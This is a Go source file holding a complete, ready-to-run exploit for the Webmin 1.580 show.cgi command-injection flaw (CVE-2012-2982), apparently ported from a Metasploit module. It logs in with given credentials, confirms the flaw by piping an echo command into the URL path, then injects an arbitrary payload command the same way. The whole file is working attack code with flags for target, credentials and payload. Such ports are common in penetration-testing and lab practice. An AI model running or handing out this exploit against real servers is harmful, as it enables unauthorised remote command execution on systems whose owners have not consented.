package main

import (
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

// Webmin 1.580 /file/show.cgi authenticated remote code execution
// CVE-2012-2982
// This is based on Metasploit's exploits/unix/webapp/webmin_show_cgi_exec
// module, which can be found on
// https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/webmin_show_cgi_exec.rb
// Rewritten in GO by tera-si
// https://github.com/tera-si

type configs struct {
	rhost    string
	rport    int
	username string
	password string
	payload  string
	appPath  string
	useSSL   bool
	verbose  bool
}

var cmdCheck string

const checkOKStatus = "200 Document follows"

func init() {
	rand.Seed(time.Now().UnixNano())

	cmdCheck = fmt.Sprintf("echo %s", getRandomString(5))
}

func main() {
	rhost := flag.String("rhost", "", "IP of target application, required")
	rport := flag.Int("rport", -1, "Port number of target application, required")
	appPath := flag.String("path", "/", "Root path of the target application, default: \"/\"")
	username := flag.String("username", "", "Username for authentication, required")
	password := flag.String("password", "", "Password for authentication, required")
	useSSL := flag.Bool("ssl", false, "Enable SSL, default: off")
	payload := flag.String("payload", "", "Payload, required")
	verbose := flag.Bool("verbose", false, "Enable verbosity, default: off")

	flag.Parse()

	if *rhost == "" || *rport == -1 || *username == "" || *password == "" || *payload == "" {
		flag.Usage()
		os.Exit(1)
	}

	config := configs{
		*rhost, *rport, *username, *password, *payload, *appPath, *useSSL, *verbose,
	}

	fmt.Println("[*] Logging in")
	sessionID, err := config.login()
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] Error: %s\n", err)
		os.Exit(2)
	}
	fmt.Printf("[i] Authentication successful. Received session ID: %s\n", sessionID)

	fmt.Println("[*] Running vulnerability check")
	isVuln, err := config.checkVuln(sessionID)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] Error: %s\n", err)
		os.Exit(3)
	}
	if !isVuln {
		fmt.Println("[!] Target is not vulnerable, aborting")
		os.Exit(0)
	}
	fmt.Println("[i] Target is vulnerable")

	fmt.Println("[*] Triggering payload:", config.payload)
	if err := config.exploit(sessionID); err != nil {
		fmt.Fprintf(os.Stderr, "[!] Error: %s\n", err)
		os.Exit(4)
	}
	fmt.Println("[i] Finished")
}

func (c configs) login() (string, error) {
	var client http.Client
	// I kept getting a bug where 200 OK was received instead of 302 Moved
	// Temporarily, making it difficult to distinguish between successful and
	// unsuccessful login attempt. Turns out this is because Golang's HTTP
	// Client follows redirect by default. I only figured this out by running
	// the script with Wireshark. This snippet here disable redirection without
	// throwing any errors.
	// Credit to Etienne Bruines on this stack overflow question:
	// https://stackoverflow.com/questions/23297520/how-can-i-make-the-go-http-client-not-follow-redirects-automatically
	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	target, err := c.buildURL(1)
	if err != nil {
		return "", err
	}

	if c.verbose {
		fmt.Println("[i] Sending login request to", target)
	}

	// Building the HTTP POST form data
	formData := url.Values{}
	formData.Add("page", "/")
	formData.Add("user", c.username)
	formData.Add("pass", c.password)
	// Returns the form values in a single url encoded string
	encodedData := formData.Encode()

	if c.verbose {
		fmt.Println("[i] Request data:", encodedData)
	}

	// Since we need to set the testing=1 cookie, we need to build a custom HTTP
	// POST request, instead of using the built in HTTP.PostForm
	req, err := http.NewRequest("POST", target, strings.NewReader(encodedData))
	req.Header.Set("Cookie", "testing=1")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Host", c.rhost)
	req.Header.Set("Content-Length", strconv.Itoa(len(encodedData)))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; rv:100.0) Gecko/20100101 Firefox/100.0")
	req.Header.Set("Accept", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	if err != nil {
		return "", err
	}

	rsp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer rsp.Body.Close()

	if c.verbose {
		fmt.Println("[i] Received response status:", rsp.Status)
		fmt.Println("[i] Received response headers:")

		for k, v := range rsp.Header {
			fmt.Printf("\t%v: %v\n", k, v)
		}
	}

	rspStatus := rsp.StatusCode
	rspSetCookie := rsp.Header.Get("Set-Cookie")

	if rspStatus != 302 || rspSetCookie == "" {
		return "", errors.New("authentication unsuccessful")
	}

	if !strings.Contains(rspSetCookie, "sid=") {
		return "", errors.New("authentication unsuccessful")
	}

	// Expected: sid=xxxxxx; path=/
	// This extracts the sid from the expected cookie values
	return strings.Split(strings.Split(rspSetCookie, "sid=")[1], ";")[0], nil
}

func (c configs) checkVuln(sessionID string) (bool, error) {
	var client http.Client

	target, err := c.buildURL(2)
	if err != nil {
		return false, err
	}

	if c.verbose {
		fmt.Println("[i] Sending vulnerability check to", target)
	}

	// Since we need to set the SID cookie, we will need custom HTTP GET request
	// here as well. But we don't need any HTTP body data this time.
	req, err := http.NewRequest("GET", target, strings.NewReader(""))
	req.Header.Set("Cookie", fmt.Sprintf("sid=%s", sessionID))
	req.Header.Set("Host", c.rhost)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; rv:100.0) Gecko/20100101 Firefox/100.0")
	req.Header.Set("Accept", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	if err != nil {
		return false, err
	}

	rsp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer rsp.Body.Close()

	if c.verbose {
		fmt.Println("[i] Received response status:", rsp.Status)
		fmt.Println("[i] Received response headers:")

		for k, v := range rsp.Header {
			fmt.Printf("\t%v: %v\n", k, v)
		}
	}

	if rsp.Status != checkOKStatus {
		return false, nil
	}

	body, err := ioutil.ReadAll(rsp.Body)
	if err != nil {
		return false, err
	}

	if c.verbose {
		fmt.Println("[i] Received response body:\n", string(body))
	}

	if strings.TrimSpace(string(body)) != strings.Split(cmdCheck, " ")[1] {
		return false, nil
	}

	return true, nil
}

func (c configs) exploit(sessionID string) error {
	var client http.Client

	target, err := c.buildURL(3)
	if err != nil {
		return err
	}

	if c.verbose {
		fmt.Println("[i] Sending exploit to", target)
	}

	// Again, custom HTTP GET without body because of SID cookie
	req, err := http.NewRequest("GET", target, strings.NewReader(""))
	req.Header.Set("Cookie", fmt.Sprintf("sid=%s", sessionID))
	req.Header.Set("Host", c.rhost)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; rv:100.0) Gecko/20100101 Firefox/100.0")
	req.Header.Set("Accept", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	if err != nil {
		return err
	}

	rsp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer rsp.Body.Close()

	if c.verbose {
		fmt.Println("[i] Received response status:", rsp.Status)
		fmt.Println("[i] Received response headers:")

		for k, v := range rsp.Header {
			fmt.Printf("\t%v: %v\n", k, v)
		}
	}

	return nil
}

func (c configs) buildURL(stage int) (string, error) {
	verb := "http"

	if c.useSSL {
		verb = "https"
	}

	baseURL := fmt.Sprintf("%s://%s:%d%s", verb, c.rhost, c.rport, c.appPath)
	if !strings.HasSuffix(c.appPath, "/") {
		baseURL += "/"
	}

	switch stage {
	case -1:
		// Only used in debugging. Normally, regular users won't see this.
		return baseURL, nil

	case 1:
		// Login
		return fmt.Sprintf("%ssession_login.cgi", baseURL), nil

	case 2:
		// Check if application is vulnerable to the attack
		return fmt.Sprintf("%sfile/show.cgi/bin/%s|%s|", baseURL, getRandomString(5), cmdCheck), nil

	case 3:
		// Exploit
		return fmt.Sprintf("%sfile/show.cgi/bin/%s|%s|", baseURL, getRandomString(5), c.payload), nil

	default:
		return "", errors.New("unrecognised exploit stage")
	}
}

// Based on Paul Hankin's solution from this stack overflow question
// https://stackoverflow.com/questions/22892120/how-to-generate-a-random-string-of-a-fixed-length-in-go/22892986#22892986
func getRandomString(length int) string {
	alphaNumeric := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

	out := make([]rune, length)
	for i := range out {
		out[i] = alphaNumeric[rand.Intn(len(alphaNumeric))]
	}

	return string(out)
}
